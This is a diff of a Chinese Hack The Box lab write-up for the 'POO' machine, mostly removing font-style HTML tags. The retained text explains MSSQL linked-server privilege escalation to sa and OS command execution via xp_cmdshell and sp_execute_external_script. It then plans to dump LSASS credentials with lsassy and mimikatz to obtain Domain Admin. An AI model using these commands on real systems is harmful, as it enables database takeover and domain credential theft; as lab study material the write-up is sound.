@@ -187,7 +187,7 @@ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-w
 - md5(eks) = dca66d38fd916317687e1390a420c3fc
 ```
 
-## <font style="color:rgb(51, 51, 51);">IIS短文件名枚举</font>
+## IIS短文件名枚举
 [https://github.com/lijiejie/IIS_shortname_Scanner](https://github.com/lijiejie/IIS_shortname_Scanner)
 
 ```c
@@ -567,30 +567,30 @@ NULL
 
 可以发现external_user 被映射成了 dbo（数据库所有者）
 
-## <font style="color:rgb(13, 13, 13);">现在能干什么？</font>
-<font style="color:rgb(13, 13, 13);">你作为</font><font style="color:rgb(13, 13, 13);"> </font>`**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">dbo@POO_PUBLIC</font>**`<font style="color:rgb(13, 13, 13);">，你</font>**<font style="color:rgb(13, 13, 13);">可以做的事情非常多</font>**<font style="color:rgb(13, 13, 13);">：</font>
+## 现在能干什么？
+你作为 `**dbo@POO_PUBLIC**`，你**可以做的事情非常多**：
 
-| **<font style="color:rgb(13, 13, 13);">能力</font>** | **<font style="color:rgb(13, 13, 13);">状态</font>** |
+| **能力** | **状态** |
 | --- | --- |
-| <font style="color:rgb(13, 13, 13);">读所有表</font> | <font style="color:rgb(13, 13, 13);">✅</font> |
-| <font style="color:rgb(13, 13, 13);">写所有表</font> | <font style="color:rgb(13, 13, 13);">✅</font> |
-| <font style="color:rgb(13, 13, 13);">创建视图 / 过程</font> | <font style="color:rgb(13, 13, 13);">✅</font> |
-| <font style="color:rgb(13, 13, 13);">ALTER 表</font> | <font style="color:rgb(13, 13, 13);">✅</font> |
-| <font style="color:rgb(13, 13, 13);">CREATE ASSEMBLY</font> | <font style="color:rgb(13, 13, 13);">❌</font><font style="color:rgb(13, 13, 13);">（取决于 CLR）</font> |
-| <font style="color:rgb(13, 13, 13);">xp_cmdshell</font> | <font style="color:rgb(13, 13, 13);">❌</font> |
-| <font style="color:rgb(13, 13, 13);">提权到 sysadmin</font> | <font style="color:rgb(13, 13, 13);">⚠️</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">有可能</font>** |
+| 读所有表 | ✅ |
+| 写所有表 | ✅ |
+| 创建视图 / 过程 | ✅ |
+| ALTER 表 | ✅ |
+| CREATE ASSEMBLY | ❌（取决于 CLR） |
+| xp_cmdshell | ❌ |
+| 提权到 sysadmin | ⚠️ **有可能** |
 
 
 ## 数据库提权
-### <font style="color:rgb(13, 13, 13);">一、当前身份确认</font>
-#### <font style="color:rgb(13, 13, 13);">1. 确认当前服务器与用户</font>
+### 一、当前身份确认
+#### 1. 确认当前服务器与用户
 ```plain
 select @@servername;
 select system_user;
 select user_name();
 ```
 
-<font style="color:rgb(13, 13, 13);">输出：</font>
+输出：
 
 ```plain
 COMPATIBILITY\POO_PUBLIC 
@@ -598,96 +598,96 @@ external_user
 external_user
 ```
 
-#### <font style="color:rgb(13, 13, 13);">📌</font><font style="color:rgb(13, 13, 13);"> 知识点解释</font>
-+ `**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">@@servername</font>**`<font style="color:rgb(13, 13, 13);">：当前 SQL Server 实例名</font>
-+ `**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">system_user</font>**`<font style="color:rgb(13, 13, 13);">：当前</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">SQL Server 登录用户</font>**
-+ `**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">user_name()</font>**`<font style="color:rgb(13, 13, 13);">：当前</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">数据库用户</font>**
+#### 📌 知识点解释
++ `**@@servername**`：当前 SQL Server 实例名
++ `**system_user**`：当前 **SQL Server 登录用户**
++ `**user_name()**`：当前 **数据库用户**
 
-<font style="color:rgb(13, 13, 13);">此时我确认：</font>
+此时我确认：
 
-+ <font style="color:rgb(13, 13, 13);">当前位于</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">POO_PUBLIC</font>**
-+ <font style="color:rgb(13, 13, 13);">使用的是一个</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">低权限外部账号 external_user</font>**
++ 当前位于 **POO_PUBLIC**
++ 使用的是一个 **低权限外部账号 external_user**
 
 ---
 
-### <font style="color:rgb(13, 13, 13);">二、发现 Linked Server（关键前置条件）</font>
-#### <font style="color:rgb(13, 13, 13);">2. 枚举链接服务器</font>
+### 二、发现 Linked Server（关键前置条件）
+#### 2. 枚举链接服务器
 ```plain
 select srvname from sysservers;
 ```
 
-<font style="color:rgb(13, 13, 13);">输出：</font>
+输出：
 
 ```plain
 COMPATIBILITY\POO_PUBLIC
 COMPATIBILITY\POO_CONFIG
 ```
 
-#### <font style="color:rgb(13, 13, 13);">📌</font><font style="color:rgb(13, 13, 13);"> 知识点解释（非常重要）</font>
-**<font style="color:rgb(13, 13, 13);">Linked Server（链接服务器）</font>**<font style="color:rgb(13, 13, 13);"> </font><font style="color:rgb(13, 13, 13);">是 MSSQL 的一种功能，允许一个 SQL Server：</font>
+#### 📌 知识点解释（非常重要）
+**Linked Server（链接服务器）** 是 MSSQL 的一种功能，允许一个 SQL Server：
 
-+ <font style="color:rgb(13, 13, 13);">使用</font>**<font style="color:rgb(13, 13, 13);">预先配置好的账号</font>**
-+ <font style="color:rgb(13, 13, 13);">去访问另一个数据库服务器</font>
-+ <font style="color:rgb(13, 13, 13);">执行 SQL 语句</font>
++ 使用**预先配置好的账号**
++ 去访问另一个数据库服务器
++ 执行 SQL 语句
 
-<font style="color:rgb(13, 13, 13);">👉</font><font style="color:rgb(13, 13, 13);"> 一旦存在 Linked Server，</font>**<font style="color:rgb(13, 13, 13);">权限就不再是“单点”的，而是“链式”的</font>**<font style="color:rgb(13, 13, 13);">。</font>
+👉 一旦存在 Linked Server，**权限就不再是“单点”的，而是“链式”的**。
 
 ---
 
-### <font style="color:rgb(13, 13, 13);">三、在远程服务器上执行 SQL</font>
-#### <font style="color:rgb(13, 13, 13);">3. 使用 Linked Server 执行远程命令</font>
+### 三、在远程服务器上执行 SQL
+#### 3. 使用 Linked Server 执行远程命令
 ```plain
 EXECUTE ('select @@servername;') at [COMPATIBILITY\POO_CONFIG];
 ```
 
-<font style="color:rgb(13, 13, 13);">输出：</font>
+输出：
 
 ```plain
 COMPATIBILITY\POO_CONFIG
 ```
 
-#### <font style="color:rgb(13, 13, 13);">📌</font><font style="color:rgb(13, 13, 13);"> 知识点解释</font>
-<font style="color:rgb(13, 13, 13);">语法结构：</font>
+#### 📌 知识点解释
+语法结构：
 
 ```plain
 EXECUTE ('SQL语句') at [LinkedServer名称]
 ```
 
-<font style="color:rgb(13, 13, 13);">含义是：</font>
+含义是：
 
 **“不要在当前服务器执行，而是让远程服务器执行”**
 
-<font style="color:rgb(13, 13, 13);">这一步证明：</font>
+这一步证明：
 
-+ <font style="color:rgb(13, 13, 13);">我可以通过</font><font style="color:rgb(13, 13, 13);"> </font>`**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">POO_PUBLIC</font>**`
-+ <font style="color:rgb(13, 13, 13);">控制</font><font style="color:rgb(13, 13, 13);"> </font>`**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">POO_CONFIG</font>**`<font style="color:rgb(13, 13, 13);"> </font><font style="color:rgb(13, 13, 13);">执行 SQL</font>
++ 我可以通过 `**POO_PUBLIC**`
++ 控制 `**POO_CONFIG**` 执行 SQL
 
 ---
 
-### <font style="color:rgb(13, 13, 13);">四、确认远程执行所使用的身份</font>
-#### <font style="color:rgb(13, 13, 13);">4. 查看在 POO_CONFIG 上的执行身份</font>
+### 四、确认远程执行所使用的身份
+#### 4. 查看在 POO_CONFIG 上的执行身份
 ```plain
 EXECUTE ('select suser_name();') at [COMPATIBILITY\POO_CONFIG];
 ```
 
-<font style="color:rgb(13, 13, 13);">输出：</font>
+输出：
 
 ```plain
 internal_user
 ```
 
-#### <font style="color:rgb(13, 13, 13);">📌</font><font style="color:rgb(13, 13, 13);"> 知识点解释（核心）</font>
-<font style="color:rgb(13, 13, 13);">这说明：</font>
+#### 📌 知识点解释（核心）
+这说明：
 
-+ **<font style="color:rgb(13, 13, 13);">Linked Server 并不是用我的 external_user 身份</font>**
-+ <font style="color:rgb(13, 13, 13);">而是用管理员配置好的</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">internal_user</font>**
++ **Linked Server 并不是用我的 external_user 身份**
++ 而是用管理员配置好的 **internal_user**
 
-<font style="color:rgb(13, 13, 13);">📌</font><font style="color:rgb(13, 13, 13);"> 这叫做</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">安全上下文映射（Security Context Mapping）</font>**
+📌 这叫做 **安全上下文映射（Security Context Mapping）**
 
 ---
 
-### <font style="color:rgb(13, 13, 13);">五、确认 internal_user 的权限等级</font>
-#### <font style="color:rgb(13, 13, 13);">5. 查询 internal_user 在 POO_CONFIG 上的权限</font>
+### 五、确认 internal_user 的权限等级
+#### 5. 查询 internal_user 在 POO_CONFIG 上的权限
 ```plain
 EXECUTE (
   'SELECT entity_name, permission_name 
@@ -695,20 +695,20 @@ EXECUTE (
 ) at [COMPATIBILITY\POO_CONFIG];
 ```
 
-<font style="color:rgb(13, 13, 13);">输出：</font>
+输出：
 
 ```plain
 server | CONNECT SQL
 ```
 
-#### <font style="color:rgb(13, 13, 13);">📌</font><font style="color:rgb(13, 13, 13);"> 知识点解释</font>
-+ `**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">fn_my_permissions</font>**`<font style="color:rgb(13, 13, 13);">：查看当前身份拥有哪些权限</font>
-+ `**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">CONNECT SQL</font>**`<font style="color:rgb(13, 13, 13);">：仅允许连接数据库</font>
+#### 📌 知识点解释
++ `**fn_my_permissions**`：查看当前身份拥有哪些权限
++ `**CONNECT SQL**`：仅允许连接数据库
 
-<font style="color:rgb(13, 13, 13);">说明：</font>
+说明：
 
-+ `**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">internal_user</font>**`<font style="color:rgb(13, 13, 13);"> </font><font style="color:rgb(13, 13, 13);">是</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">低权限账号</font>**
-+ <font style="color:rgb(13, 13, 13);">无法直接提权或执行系统命令</font>
++ `**internal_user**` 是 **低权限账号**
++ 无法直接提权或执行系统命令
 
 
 
@@ -799,8 +799,8 @@ SERVER
 
 ---
 
-### <font style="color:rgb(13, 13, 13);">六、关键漏洞点：权限“回弹”测试</font>
-#### <font style="color:rgb(13, 13, 13);">6. 让 POO_CONFIG 再反向访问 POO_PUBLIC</font>
+### 六、关键漏洞点：权限“回弹”测试
+#### 6. 让 POO_CONFIG 再反向访问 POO_PUBLIC
 ```plain
 EXEC ('EXEC (''select suser_name();'') at [COMPATIBILITY\POO_PUBLIC]') at [COMPATIBILITY\POO_CONFIG];
 ```
@@ -812,7 +812,7 @@ EXEC (
 ) at [COMPATIBILITY\POO_CONFIG];
 ```
 
-<font style="color:rgb(13, 13, 13);">输出：</font>
+输出：
 
 ```plain
 sa
@@ -820,9 +820,9 @@ sa
 
 ---
 
-### <font style="color:rgb(13, 13, 13);">七、漏洞原理详解（整题核心）</font>
-#### <font style="color:rgb(13, 13, 13);">📌</font><font style="color:rgb(13, 13, 13);"> 发生了什么？（一定要写清楚）</font>
-<font style="color:rgb(13, 13, 13);">这里实际发生的是</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">两次跳转</font>**<font style="color:rgb(13, 13, 13);">：</font>
+### 七、漏洞原理详解（整题核心）
+#### 📌 发生了什么？（一定要写清楚）
+这里实际发生的是 **两次跳转**：
 
 ```plain
 external_user
@@ -830,27 +830,27 @@ external_user
    →（Linked）→ POO_PUBLIC（sa）
 ```
 
-#### <font style="color:rgb(13, 13, 13);">📌</font><font style="color:rgb(13, 13, 13);"> 根本原因</font>
-<font style="color:rgb(13, 13, 13);">管理员错误地配置了</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">双向 Linked Server</font>**<font style="color:rgb(13, 13, 13);">：</font>
+#### 📌 根本原因
+管理员错误地配置了 **双向 Linked Server**：
 
-| **<font style="color:rgb(13, 13, 13);">方向</font>** | **<font style="color:rgb(13, 13, 13);">使用账号</font>** |
+| **方向** | **使用账号** |
 | --- | --- |
-| <font style="color:rgb(13, 13, 13);">POO_PUBLIC → POO_CONFIG</font> | <font style="color:rgb(13, 13, 13);">internal_user（低权）</font> |
-| <font style="color:rgb(13, 13, 13);">POO_CONFIG → POO_PUBLIC</font> | **<font style="color:rgb(13, 13, 13);">sa（高权）</font>** |
+| POO_PUBLIC → POO_CONFIG | internal_user（低权） |
+| POO_CONFIG → POO_PUBLIC | **sa（高权）** |
 
 
-<font style="color:rgb(13, 13, 13);">原本假设：</font>
+原本假设：
 
-**<font style="color:rgb(13, 13, 13);">“只有内部服务器才会使用这个链接”</font>**
+**“只有内部服务器才会使用这个链接”**
 
-<font style="color:rgb(13, 13, 13);">但实际上：</font>
+但实际上：
 
 **外部用户可以借道 POO_CONFIG，再“弹回” POO_PUBLIC**
 
 ---
 
-### <font style="color:rgb(13, 13, 13);">八、确认已获得服务器级最高权限</font>
-#### <font style="color:rgb(13, 13, 13);">7. 查看 sa 权限</font>
+### 八、确认已获得服务器级最高权限
+#### 7. 查看 sa 权限
 ```plain
 EXECUTE ('EXECUTE (''SELECT entity_name, permission_name FROM fn_my_permissions(NULL, ''''SERVER'''');'') at [COMPATIBILITY\POO_PUBLIC]') at [COMPATIBILITY\POO_CONFIG];
 ```
@@ -864,7 +864,7 @@ EXECUTE (
 ) at [COMPATIBILITY\POO_CONFIG];
 ```
 
-<font style="color:rgb(13, 13, 13);">输出包含：</font>
+输出包含：
 
 ```plain
 SQL (external_user  dbo@POO_PUBLIC)> EXECUTE ('EXECUTE (''SELECT entity_name, permission_name FROM fn_my_permissions(NULL, ''''SERVER'''');'') at [COMPATIBILITY\POO_PUBLIC]') at [COMPATIBILITY\POO_CONFIG];
@@ -906,10 +906,10 @@ server        SELECT ALL USER SECURABLES
 server        CONTROL SERVER   
 ```
 
-#### <font style="color:rgb(13, 13, 13);">📌</font><font style="color:rgb(13, 13, 13);"> 知识点解释</font>
-+ `**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">CONTROL SERVER</font>**`<font style="color:rgb(13, 13, 13);"> </font><font style="color:rgb(13, 13, 13);">≈</font><font style="color:rgb(13, 13, 13);"> </font>`**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">sysadmin</font>**`
-+ <font style="color:rgb(13, 13, 13);">等价于</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">数据库最高权限</font>**
-+ <font style="color:rgb(13, 13, 13);">可开启</font><font style="color:rgb(13, 13, 13);"> </font>`**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">xp_cmdshell</font>**`<font style="color:rgb(13, 13, 13);">，执行系统命令</font>
+#### 📌 知识点解释
++ `**CONTROL SERVER**` ≈ `**sysadmin**`
++ 等价于 **数据库最高权限**
++ 可开启 `**xp_cmdshell**`，执行系统命令
 
 ## 权限维持
 ```plain
@@ -1047,9 +1047,9 @@ At line:1 char:449
 NULL      
 ```
 
-原因是`**<font style="background-color:rgb(236, 236, 236);">NT SERVICE\MSSQL$POO_PUBLIC</font>**`**<font style="color:rgb(13, 13, 13);"> 这个服务账户被限制了主动出网</font>**
+原因是`**NT SERVICE\MSSQL$POO_PUBLIC**`** 这个服务账户被限制了主动出网**
 
-## <font style="color:rgb(13, 13, 13);">提权</font>
+## 提权
 ```c
 SQL (god  dbo@master)> EXEC xp_cmdshell 'whoami /priv';
 output                                                                             
@@ -1110,26 +1110,26 @@ NULL
 ```
 
 ### C:\inetpub
-<font style="color:rgb(13, 13, 13);">这是 </font>IIS 的默认根目录
+这是 IIS 的默认根目录
 
-<font style="color:rgb(13, 13, 13);">在 Windows 上，只要装了 IIS（哪怕只是：</font>
+在 Windows 上，只要装了 IIS（哪怕只是：
 
-+ <font style="color:rgb(13, 13, 13);">Web 服务</font>
-+ <font style="color:rgb(13, 13, 13);">ASP.NET</font>
-+ <font style="color:rgb(13, 13, 13);">Web 管理组件）</font>
++ Web 服务
++ ASP.NET
++ Web 管理组件）
 
-<font style="color:rgb(13, 13, 13);">系统</font>**<font style="color:rgb(13, 13, 13);">默认就会创建</font>**<font style="color:rgb(13, 13, 13);">：</font>
+系统**默认就会创建**：
 
 ```plain
 C:\inetpub\
 └── wwwroot\
 ```
 
-<font style="color:rgb(13, 13, 13);">哪怕网站后来换路径，这个目录也</font>**<font style="color:rgb(13, 13, 13);">经常还在</font>**<font style="color:rgb(13, 13, 13);">。</font>
+哪怕网站后来换路径，这个目录也**经常还在**。
 
-<font style="color:rgb(13, 13, 13);">根据我们80端口存在/admin路由需要登录</font>
+根据我们80端口存在/admin路由需要登录
 
-### <font style="color:rgb(13, 13, 13);">web.config  </font>
+### web.config  
 `web.config` 是 **ASP.NET 网站的配置文件**，作用范围是：
 
 + 当前目录
@@ -1199,25 +1199,25 @@ NULL
 + ❌ 普通服务账号
 + ❌ SQL Server 服务账号
 
-### **<font style="color:rgb(13, 13, 13);">sp_execute_external_script</font>**
-<font style="color:rgb(13, 13, 13);">在 MSSQL 的知识体系里，  
-</font>**<font style="color:rgb(13, 13, 13);">只有 3 种东西能直接碰 OS：</font>**
+### **sp_execute_external_script**
+在 MSSQL 的知识体系里，  
+**只有 3 种东西能直接碰 OS：**
 
-| **<font style="color:rgb(13, 13, 13);">方法</font>** | **<font style="color:rgb(13, 13, 13);">执行身份</font>** |
+| **方法** | **执行身份** |
 | --- | --- |
-| <font style="color:rgb(13, 13, 13);">xp_cmdshell</font> | <font style="color:rgb(13, 13, 13);">SQL Server 服务账户</font> |
-| <font style="color:rgb(13, 13, 13);">CLR</font> | <font style="color:rgb(13, 13, 13);">AppDomain / 服务账户</font> |
-| **<font style="color:rgb(13, 13, 13);">sp_execute_external_script</font>** | **<font style="color:rgb(13, 13, 13);">独立 Launchpad 进程</font>** |
+| xp_cmdshell | SQL Server 服务账户 |
+| CLR | AppDomain / 服务账户 |
+| **sp_execute_external_script** | **独立 Launchpad 进程** |
 
 
-<font style="color:rgb(13, 13, 13);">👉</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">只有第三个“身份不一样”</font>**
+👉 **只有第三个“身份不一样”**
 
 >  因为 `sp_execute_external_script` 从设计之初就不是“SQL Server 的一部分”，  
 而是一个“被 SQL Server 调用的外部计算子系统”，  
 所以它必须、也只能用“不同的 Windows 身份”运行。  
 >
 
-### <font style="color:rgb(56, 58, 66);background-color:rgb(249, 249, 249);">poo_public01</font>
+### poo_public01
 ```plain
 SQL (god  dbo@master)> EXEC sp_execute_external_script @language =N'Python', @script = N'import os; os.system("whoami");';
 INFO(COMPATIBILITY\POO_PUBLIC): Line 0: STDOUT message(s) from external script: 
@@ -1228,7 +1228,7 @@ Express Edition will continue to be enforced.
 
 现在我可以以 `poo_public01` 身份运行。
 
-## <font style="color:rgb(13, 13, 13);">web.config  </font>
+## web.config  
 ```plain
 SQL (god  dbo@master)> EXEC sp_execute_external_script @language =N'Python', @script = N'import os; os.system("type \inetpub\wwwroot\web.config");';
 INFO(COMPATIBILITY\POO_PUBLIC): Line 0: STDOUT message(s) from external script: 
@@ -1727,206 +1727,206 @@ COMPATIBILITY.INTRANET.POO
                                → ADMINISTRATOR@INTRANET.POO
 ```
 
-### <font style="color:rgb(13, 13, 13);">🧠</font><font style="color:rgb(13, 13, 13);"> 第一步：</font>`<font style="background-color:rgb(236, 236, 236);">HasSession</font>`
-**<font style="color:rgb(13, 13, 13);">COMPATIBILITY 这台机器上，当前有 P00_ADM 登录过  
-</font>****<font style="color:rgb(13, 13, 13);">而 P00_ADM 是 Domain Admin  
-</font>****<font style="color:rgb(13, 13, 13);">Domain Admin 对 Administrator 拥有完全控制权</font>**
+### 🧠 第一步：`HasSession`
+**COMPATIBILITY 这台机器上，当前有 P00_ADM 登录过  
+****而 P00_ADM 是 Domain Admin  
+****Domain Admin 对 Administrator 拥有完全控制权**
 
 ```c
 COMPATIBILITY → HasSession → P00_ADM
 ```
 
-#### <font style="color:rgb(13, 13, 13);">🔥</font><font style="color:rgb(13, 13, 13);"> 为什么 HasSession 很值钱？</font>
-<font style="color:rgb(13, 13, 13);">因为这意味着：</font>
+#### 🔥 为什么 HasSession 很值钱？
+因为这意味着：
 
 **如果你控制了 COMPATIBILITY  
 ****你就有机会“偷到” P00_ADM 的凭据**
 
-<font style="color:rgb(13, 13, 13);">方式包括：</font>
+方式包括：
 
-+ <font style="color:rgb(13, 13, 13);">LSASS dump</font>
-+ <font style="color:rgb(13, 13, 13);">token stealing</font>
-+ <font style="color:rgb(13, 13, 13);">mimikatz</font>
++ LSASS dump
++ token stealing
++ mimikatz
 
-### <font style="color:rgb(13, 13, 13);">🧠</font><font style="color:rgb(13, 13, 13);"> 第二步：</font>`<font style="background-color:rgb(236, 236, 236);">P00_ADM@INTRANET.POO</font>`<font style="color:rgb(13, 13, 13);"> 是谁？</font>
-<font style="color:rgb(13, 13, 13);">你贴的 Node 信息我直接给你翻译重点 </font><font style="color:rgb(13, 13, 13);">👇</font>
+### 🧠 第二步：`P00_ADM@INTRANET.POO` 是谁？
+你贴的 Node 信息我直接给你翻译重点 👇
 
-#### <font style="color:rgb(13, 13, 13);">1️⃣</font><font style="color:rgb(13, 13, 13);"> Tier Zero: </font>TRUE
-<font style="color:rgb(13, 13, 13);">👉</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">域顶级权限</font>**
+#### 1️⃣ Tier Zero: TRUE
+👉 **域顶级权限**
 
-#### <font style="color:rgb(13, 13, 13);">2️⃣</font><font style="color:rgb(13, 13, 13);"> Admin Count: </font>TRUE
-<font style="color:rgb(13, 13, 13);">👉</font><font style="color:rgb(13, 13, 13);"> 受 AdminSDHolder 保护</font>
+#### 2️⃣ Admin Count: TRUE
+👉 受 AdminSDHolder 保护
 
-#### <font style="color:rgb(13, 13, 13);">3️⃣</font><font style="color:rgb(13, 13, 13);"> MemberOf:</font>
-+ **<font style="color:rgb(13, 13, 13);">DOMAIN ADMINS</font>**
-+ <font style="color:rgb(13, 13, 13);">（基本等于：域已经没秘密了）</font>
+#### 3️⃣ MemberOf:
++ **DOMAIN ADMINS**
++ （基本等于：域已经没秘密了）
 
-<font style="color:rgb(13, 13, 13);">📌</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">一句话</font>**<font style="color:rgb(13, 13, 13);">：</font>
+📌 **一句话**：
 
 **P00_ADM 本身就是域管理员**
 
 # 提权
-## <font style="color:rgb(13, 13, 13);">目标</font>
-> ### <font style="color:rgb(13, 13, 13);">① BloodHound 结论</font>
+## 目标
+> ### ① BloodHound 结论
 > **P00_ADM 曾在 COMPATIBILITY 登录**
 >
-> ### <font style="color:rgb(13, 13, 13);">② 攻击思路</font>
+> ### ② 攻击思路
 > **在 COMPATIBILITY 上 dump P00_ADM 凭据**
 >
-> ### <font style="color:rgb(13, 13, 13);">③ 成功结果</font>
+> ### ③ 成功结果
 > **拿到 Domain Admin**
 >
 
-## <font style="color:rgb(13, 13, 13);">工具路线</font>
-<font style="color:rgb(13, 13, 13);">接下来会用到的工具 </font>**<font style="color:rgb(13, 13, 13);">只有 3 类</font>**<font style="color:rgb(13, 13, 13);">：</font>
+## 工具路线
+接下来会用到的工具 **只有 3 类**：
 
-| **<font style="color:rgb(13, 13, 13);">阶段</font>** | **<font style="color:rgb(13, 13, 13);">工具</font>** | **<font style="color:rgb(13, 13, 13);">干嘛</font>** |
+| **阶段** | **工具** | **干嘛** |
 | --- | --- | --- |
-| <font style="color:rgb(13, 13, 13);">1️⃣</font><font style="color:rgb(13, 13, 13);"> 枚举</font> | `**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">query user / klist</font>**` | <font style="color:rgb(13, 13, 13);">确认 P00_ADM 是否真的在</font> |
-| <font style="color:rgb(13, 13, 13);">2️⃣</font><font style="color:rgb(13, 13, 13);"> 抓凭据</font> | `**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">mimikatz</font>**`<br/><font style="color:rgb(13, 13, 13);"> </font><font style="color:rgb(13, 13, 13);">/</font><font style="color:rgb(13, 13, 13);"> </font>`**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">lsassy</font>**`<br/><font style="color:rgb(13, 13, 13);"> </font><font style="color:rgb(13, 13, 13);">/</font><font style="color:rgb(13, 13, 13);"> </font>`**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">procdump</font>**` | <font style="color:rgb(13, 13, 13);">从内存偷</font> |
-| <font style="color:rgb(13, 13, 13);">3️⃣</font><font style="color:rgb(13, 13, 13);"> 利用</font> | `**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">evil-winrm</font>**`<br/><font style="color:rgb(13, 13, 13);"> </font><font style="color:rgb(13, 13, 13);">/</font><font style="color:rgb(13, 13, 13);"> </font>`**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">impacket</font>**` | <font style="color:rgb(13, 13, 13);">用 DA 登录 DC</font> |
+| 1️⃣ 枚举 | `**query user / klist**` | 确认 P00_ADM 是否真的在 |
+| 2️⃣ 抓凭据 | `**mimikatz**`<br/> / `**lsassy**`<br/> / `**procdump**` | 从内存偷 |
+| 3️⃣ 利用 | `**evil-winrm**`<br/> / `**impacket**` | 用 DA 登录 DC |
 
 
-### <font style="color:rgb(13, 13, 13);">✅</font><font style="color:rgb(13, 13, 13);"> 第 1 步：确认 P00_ADM 是否真的“在这台机器上”</font>
-<font style="color:rgb(13, 13, 13);">你现在在</font><font style="color:rgb(13, 13, 13);"> </font>`**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">COMPATIBILITY</font>**`<font style="color:rgb(13, 13, 13);">，先做</font>**<font style="color:rgb(13, 13, 13);">验证型操作</font>**<font style="color:rgb(13, 13, 13);">。</font>
+### ✅ 第 1 步：确认 P00_ADM 是否真的“在这台机器上”
+你现在在 `**COMPATIBILITY**`，先做**验证型操作**。
 
-#### <font style="color:rgb(13, 13, 13);">① 看当前登录用户</font>
+#### ① 看当前登录用户
 ```plain
 query user
 ```
 
-<font style="color:rgb(13, 13, 13);">如果你看到类似：</font>
+如果你看到类似：
 
 ```plain
 P00_ADM    console   Active
 ```
 
-<font style="color:rgb(13, 13, 13);">👉</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">直接起飞</font>**
+👉 **直接起飞**
 
 ---
 
-#### <font style="color:rgb(13, 13, 13);">② 看 Kerberos 票据（非常关键）</font>
+#### ② 看 Kerberos 票据（非常关键）
 ```plain
 klist
 ```
 
-<font style="color:rgb(13, 13, 13);">如果你看到：</font>
+如果你看到：
 
 ```plain
 INTRANET.POO\P00_ADM
 ```
 
-<font style="color:rgb(13, 13, 13);">📌</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">BloodHound 的 HasSession 被你实锤了</font>**
+📌 **BloodHound 的 HasSession 被你实锤了**
 
 ---
 
-### <font style="color:rgb(13, 13, 13);">✅</font><font style="color:rgb(13, 13, 13);"> 第 2 步：抓凭据（核心）</font>
-<font style="color:rgb(13, 13, 13);">你现在是：</font>
+### ✅ 第 2 步：抓凭据（核心）
+你现在是：
 
-+ <font style="color:rgb(13, 13, 13);">本地 Administrator</font>
-+ <font style="color:rgb(13, 13, 13);">High Integrity</font>
-+ <font style="color:rgb(13, 13, 13);">有</font><font style="color:rgb(13, 13, 13);"> </font>`**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">SeDebugPrivilege</font>**`
++ 本地 Administrator
++ High Integrity
++ 有 `**SeDebugPrivilege**`
 
-<font style="color:rgb(13, 13, 13);">👉</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">= 能读 LSASS</font>**
+👉 **= 能读 LSASS**
 
 ---
 
-#### <font style="color:rgb(13, 13, 13);">🥇</font><font style="color:rgb(13, 13, 13);"> 首选方案（HTB 最稳）：lsassy（推荐）</font>
-##### <font style="color:rgb(13, 13, 13);">Kali 上执行：</font>
+#### 🥇 首选方案（HTB 最稳）：lsassy（推荐）
+##### Kali 上执行：
 ```plain
 lsassy -d intranet.poo -u Administrator -p '<你当前密码>' <COMPATIBILITY_IP>
 ```
 
-<font style="color:rgb(13, 13, 13);">成功的话你会看到：</font>
+成功的话你会看到：
 
 ```plain
 Username: P00_ADM
 Password: ********
 ```
 
-<font style="color:rgb(13, 13, 13);">📌</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">这是最爽的一种</font>**
+📌 **这是最爽的一种**
 
 ---
 
-#### <font style="color:rgb(13, 13, 13);">🥈</font><font style="color:rgb(13, 13, 13);"> 备选方案：mimikatz（经典必会）</font>
-##### <font style="color:rgb(13, 13, 13);">① 传 mimikatz</font>
+#### 🥈 备选方案：mimikatz（经典必会）
+##### ① 传 mimikatz
 ```plain
 upload mimikatz.exe
 ```
 
-##### <font style="color:rgb(13, 13, 13);">② 执行</font>
+##### ② 执行
 ```plain
 .\mimikatz.exe
 ```
 
